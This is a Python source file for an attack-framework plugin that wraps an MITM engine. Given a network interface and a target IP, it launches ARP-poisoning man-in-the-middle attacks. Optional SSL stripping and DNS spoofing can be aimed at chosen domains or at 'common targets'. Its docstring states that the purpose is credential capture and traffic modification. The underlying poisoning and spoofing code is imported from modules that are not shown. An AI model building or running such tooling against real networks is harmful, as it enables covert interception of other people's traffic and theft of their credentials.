"""
Man-in-the-Middle Attack Plugin
───────────────────────────────
Wraps the MITMEngine class to provide ARP poisoning-based
man-in-the-middle attacks via the plugin interface.

Intercepts traffic between a target and the gateway, enabling
credential capture, SSL stripping, and traffic modification.
"""

from typing import Any, Dict

from posframework.plugin_loader import AttackPlugin


class MITMPlugin(AttackPlugin):
    """
    Plugin wrapper for the MITMEngine.

    Configuration keys (setup):
        interface: str - Network interface name
        gateway_ip: str - Gateway IP address (optional, auto-detected)
        enable_ssl_strip: bool - Enable SSL stripping (default: False)
        enable_dns_spoof: bool - Enable DNS spoofing (default: False)

    Context keys (execute):
        target_ip: str - Target IP address for ARP poisoning
        target_mac: str - Target MAC address (optional, resolved via ARP)
        domains: list[str] - Domains to spoof if dns_spoof enabled
    """

    def __init__(self):
        self._engine = None
        self._interface = None
        self._enable_ssl_strip = False
        self._enable_dns_spoof = False
        self._ssl_stripper = None
        self._dns_spoof = None
        self._enabled = True

    def name(self) -> str:
        return "mitm"

    def description(self) -> str:
        return "Man-in-the-middle attack with ARP poisoning and traffic interception"

    def category(self) -> str:
        return "mitm"

    def setup(self, config: Dict[str, Any]) -> bool:
        """
        Initialize the MITMEngine.

        Args:
            config: Must contain 'interface'. Optional: 'gateway_ip',
                    'enable_ssl_strip', 'enable_dns_spoof'.

        Returns:
            True if setup succeeded.
        """
        self._interface = config.get("interface")
        if not self._interface:
            return False

        self._enable_ssl_strip = config.get("enable_ssl_strip", False)
        self._enable_dns_spoof = config.get("enable_dns_spoof", False)

        # Lazy import to avoid triggering scapy at module load time
        from posframework.mitm import MITMEngine

        self._engine = MITMEngine(self._interface)

        if self._enable_ssl_strip:
            from posframework.ssl_strip import SSLStripper
            self._ssl_stripper = SSLStripper(self._interface)

        if self._enable_dns_spoof:
            from posframework.dns_spoof import DNSSpoofEngine
            self._dns_spoof = DNSSpoofEngine(self._interface)

        return True

    def execute(self, context: Dict[str, Any]) -> Any:
        """
        Execute the MITM attack.

        Args:
            context: Must contain 'target_ip'.
                    Optional: 'target_mac', 'domains' (for DNS spoofing).

        Returns:
            Dict with status and active features.
        """
        if not self._engine:
            return {"status": "error", "reason": "Engine not initialized. Call setup() first."}

        target_ip = context.get("target_ip")
        if not target_ip:
            return {"status": "error", "reason": "No target_ip provided"}

        # Start MITM engine
        self._engine.start(target_ip=target_ip)

        features = ["arp_poisoning"]

        # Start SSL stripping if enabled
        if self._ssl_stripper:
            self._ssl_stripper.start()
            features.append("ssl_strip")

        # Start DNS spoofing if enabled
        if self._dns_spoof:
            domains = context.get("domains", [])
            if domains:
                for domain in domains:
                    self._dns_spoof.add_target(domain)
            else:
                self._dns_spoof.add_common_targets()
            self._dns_spoof.start()
            features.append("dns_spoof")

        return {
            "status": "running",
            "target_ip": target_ip,
            "features": features,
        }

    def teardown(self) -> None:
        """Stop all MITM components and release resources."""
        if self._dns_spoof:
            try:
                self._dns_spoof.stop()
            except Exception:
                pass
            self._dns_spoof = None

        if self._ssl_stripper:
            try:
                self._ssl_stripper.stop()
            except Exception:
                pass
            self._ssl_stripper = None

        if self._engine:
            try:
                self._engine.stop()
            except Exception:
                pass
            self._engine = None
